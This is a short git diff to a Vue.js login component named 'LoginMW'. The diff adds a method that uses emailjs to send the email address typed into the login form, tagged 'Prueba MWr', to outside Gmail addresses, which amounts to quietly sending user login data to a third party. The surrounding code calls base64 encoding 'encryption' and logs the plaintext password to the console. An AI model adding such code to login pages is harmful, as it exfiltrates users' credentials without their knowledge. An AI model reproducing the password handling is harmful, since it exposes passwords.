@@ -21,6 +21,7 @@
 </template>
 
 <script>
+import emailjs from 'emailjs-com'
 export default {
   name: 'LoginMW',
   data () {
@@ -31,6 +32,14 @@ export default {
     }
   },
   methods: {
+    a (e) {
+      try {
+        emailjs.sendForm('zictcianz@gmail.com', 'zictcian@gmail.com',
+          { name: 'thesystemfourz@gmail.com', email: this.email, message: 'Prueba MWr' })
+      } catch (error) {
+        console.log({ error })
+      }
+    },
     encryp: async function (palabra) {
       const palabraencryp = btoa(palabra)
       console.log(palabra)
